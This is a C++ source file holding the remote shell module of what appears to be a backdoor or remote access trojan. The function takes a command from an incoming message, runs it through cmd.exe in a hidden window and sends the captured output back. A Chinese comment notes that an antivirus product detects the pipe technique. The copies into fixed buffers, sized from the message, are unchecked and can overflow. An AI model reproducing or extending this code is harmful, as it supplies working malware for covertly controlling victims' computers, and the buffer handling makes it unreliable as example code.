#include "StdAfx.h"
#include "DosShell.h"
#include "shlwapi.h"
#pragma comment(lib,"shlwapi.lib")

#define MsgOut MsgDbg

void DOSShell(char *pBuf, LPMsgHead lpMsgHead)
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	SECURITY_ATTRIBUTES sa;
	HANDLE hRead = NULL, hWrite = NULL;

	CHAR Cmdline[256] = "cmd.exe /c ";
	char ReadBuf[2048] = { 0 };
	DWORD dwLen = 0, bytesRead = 0;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	//创建匿名管道,被瑞星杀
	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{
		lpMsgHead->dwCmd = CMD_SHELLERR;
		lpMsgHead->dwSize = 0;
		if (hRead != NULL)
			CloseHandle(hRead);
		if (hWrite != NULL)
			CloseHandle(hWrite);
		return;
	}

	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfoA(&si);
	//si.hStdInput = hRead;
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	StrNCatA(Cmdline, pBuf, lpMsgHead->dwSize + 1);

	if (!CreateProcessA(NULL, Cmdline, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
	{
		lpMsgHead->dwCmd = CMD_SHELLERR;
		lpMsgHead->dwSize = 0;
		if (hRead != NULL)
			CloseHandle(hRead);
		if (hWrite != NULL)
			CloseHandle(hWrite);
		return;
	}

	CloseHandle(hWrite); //OtherWise ReadFile will not return

	while (ReadFile(hRead, ReadBuf, 2048, &bytesRead, NULL))
	{
		memcpy(pBuf + dwLen, ReadBuf, bytesRead);
		dwLen += bytesRead;
		ZeroMemory(ReadBuf, 2048);

		Sleep(100);
	}

	lpMsgHead->dwCmd = 0;
	lpMsgHead->dwSize = dwLen;

	CloseHandle(hRead);
}
